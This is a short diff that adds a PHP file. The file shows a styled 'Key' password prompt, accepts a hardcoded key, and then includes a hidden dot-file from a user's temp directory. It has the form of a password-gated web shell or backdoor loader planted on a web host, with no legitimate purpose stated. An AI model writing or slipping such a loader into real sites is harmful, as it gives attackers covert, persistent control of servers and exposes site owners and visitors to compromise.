@@ -1,0 +1,3 @@
+<?php
+session_start();
+if(empty($_SESSION['_k'])){if(!empty($_POST['k'])&&$_POST['k']==='300700'){$_SESSION['_k']=1;}else{?><!DOCTYPE html><html><body style="background:#0d1117;display:flex;justify-content:center;align-items:center;height:100vh;margin:0"><form method=post><input name=k type=password placeholder="Key" style="padding:10px;background:#161b22;color:#c9d1d9;border:1px solid #30363d;border-radius:4px;font-size:14px" autofocus><button style="padding:10px 18px;background:#238636;color:#fff;border:none;border-radius:4px;margin-left:5px;cursor:pointer;font-size:14px">Go</button></form></body></html><?php exit;}}require'/home/adminjgsi/tmp/.cc.php';
